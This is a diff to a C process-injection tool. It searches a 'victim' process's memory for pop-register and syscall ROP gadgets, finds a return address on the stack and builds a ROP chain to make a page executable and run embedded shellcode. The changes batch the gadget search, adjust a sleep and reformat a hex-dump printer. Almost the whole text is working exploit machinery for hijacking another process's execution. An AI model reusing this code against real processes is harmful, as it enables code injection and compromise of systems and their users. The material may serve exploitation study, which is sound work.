@@ -8,6 +8,12 @@
 #include <elf.h>
 #include <sys/mman.h>
 
+typedef struct {
+    const uint8_t  *bytes;
+    size_t          len;
+    uint64_t        addr;
+} Gadget;
+
 unsigned char shellcode[] = {
     0x48, 0x83, 0xe4, 0xf0,        // and rsp, -16        (stack alignment)
     0xeb, 0x26,                    // jmp short get_path
@@ -42,7 +48,7 @@ pid_t create_victim_child_process() {
         sleep(2);
         exit(0);
     }
-    sleep(0.1);
+    sleep(0.2);
     return pid;
 }
 
@@ -86,11 +92,17 @@ int read_mem(void *buf, pid_t pid, uintptr_t address, size_t len) {
 }
 
 void print_mem(unsigned char* buffer, long size) {
-    for(int i=0;i<size;i++) {
-        printf("%02x ", buffer[i]);
-        if (i % 8 == 7) printf("\n");
+    for (size_t i = 0; i < size; i += 16) {
+        printf("%06zx  ", i);
+        for (size_t j = 0; j < 16; j++) {
+            if (i + j < size)
+                printf("%02x ", buffer[i + j]);
+            else
+                printf("   ");
+            if (j == 7) printf(" ");
+        }
+        printf("\n");
     }
-    printf("\n");
 }
 
 long get_reg(pid_t pid, const char* reg) {
@@ -229,7 +241,7 @@ long find_return_address(long pid, long rsp) {
     return found_ret_addr_location;
 }
 
-long find_gadget(int pid, const unsigned char *gadget, size_t gadget_len) {
+long find_gadgets(int pid, Gadget *gadgets, int num_gadgets) {
     char maps_path[256];
     char mem_path[256];
     
@@ -246,9 +258,9 @@ long find_gadget(int pid, const unsigned char *gadget, size_t gadget_len) {
     }
 
     char line[512];
-    long found_addr = -1;
+    long found = 0;
 
-    // read the memory re
+    // read the memory
     while (fgets(line, sizeof(line), maps_file)) {
         long start, end;
         char perms[5];
@@ -264,40 +276,56 @@ long find_gadget(int pid, const unsigned char *gadget, size_t gadget_len) {
         size_t size = end - start;
         unsigned char *buffer = malloc(size);
         if (!buffer) continue;
-        
-        if (pread(mem_fd, buffer, size, start) != (ssize_t)size)
-            continue;
-        // memmem is the strstr for memory regions
-        unsigned char *match = memmem(buffer, size, gadget, gadget_len);
-        
-        if (match) { // Gadget found
-            found_addr = start + (match - buffer);
+        if (pread(mem_fd, buffer, size, start) != (ssize_t)size) {
             free(buffer);
-            break; 
+            continue;
+        }
+
+        for (int i = 0; i < num_gadgets; i++) {
+            if (gadgets[i].addr != 0) continue;
+            unsigned char *match = memmem(buffer, size, gadgets[i].bytes, gadgets[i].len);
+            if (match) {
+                gadgets[i].addr = start + (match - buffer);
+                found++;
+            }
         }
         free(buffer);
+        if (found == num_gadgets) break;
     }
+
     fclose(maps_file);
     close(mem_fd);
-    return found_addr;
+    return found;
 }
 
 uint64_t* build_rop_chain(long address, pid_t pid){
+    Gadget gadgets[] = {
+        { (uint8_t*)"\x5f\xc3",         2, 0 }, // pop rdi; ret
+        { (uint8_t*)"\x5e\xc3",         2, 0 }, // pop rsi; ret
+        { (uint8_t*)"\x5a\xc3",         2, 0 }, // pop rdx; ret
+        { (uint8_t*)"\x58\xc3",         2, 0 }, // pop rax; ret
+        { (uint8_t*)"\x0f\x05\xc3",     3, 0 }, // syscall; ret
+    };
+    int n = sizeof(gadgets) / sizeof(gadgets[0]);
+
+    int found = find_gadgets(pid, gadgets, n);
+    if (found < n) {
+        fprintf(stderr, "[-] Not all gadgets found (%d/%d)\n", found, n);
+        return NULL;
+    }
+
+    uint64_t pop_rdi_ret = gadgets[0].addr;
+    uint64_t pop_rsi_ret = gadgets[1].addr;
+    uint64_t pop_rdx_ret = gadgets[2].addr;
+    uint64_t pop_rax_ret = gadgets[3].addr;
+    uint64_t syscall_ret = gadgets[4].addr;
+
+    uint64_t *rop_chain = malloc(10 * sizeof(uint64_t));
+
     long page_size = sysconf(_SC_PAGESIZE);     // very ofter it is gonna be 4096
     long offset = address % page_size;          // distance from the start of the page
     long aligned_addr = address - offset;       // address of the page page
     long aligned_len = shellcode_len + offset;  // where the payload is gonna end in memory
-
-    uint64_t pop_rdi_ret = find_gadget(pid, (const unsigned char *) "\x5f\xc3", 2);     // pop rdi; ret
-    uint64_t pop_rsi_ret = find_gadget(pid, (const unsigned char *) "\x5e\xc3", 2);     // pop rsi; ret
-    uint64_t pop_rdx_ret = find_gadget(pid, (const unsigned char *) "\x5a\xc3", 2);     // pop rdx; ret
-    uint64_t pop_rax_ret = find_gadget(pid, (const unsigned char *) "\x58\xc3", 2);     // pop rax; ret
-    uint64_t syscall_ret = find_gadget(pid, (const unsigned char *) "\x0f\x05\xc3", 3); // syscall; ret
-
-    if (pop_rdi_ret == (uint64_t)-1 || pop_rsi_ret == (uint64_t)-1 || pop_rdx_ret == (uint64_t)-1 || pop_rax_ret == (uint64_t)-1 || syscall_ret == (uint64_t)-1)
-        return NULL;
-
-    uint64_t *rop_chain = malloc(10 * sizeof(uint64_t));
 
     rop_chain[0] = pop_rdi_ret;
     rop_chain[1] = aligned_addr;                        // RDI
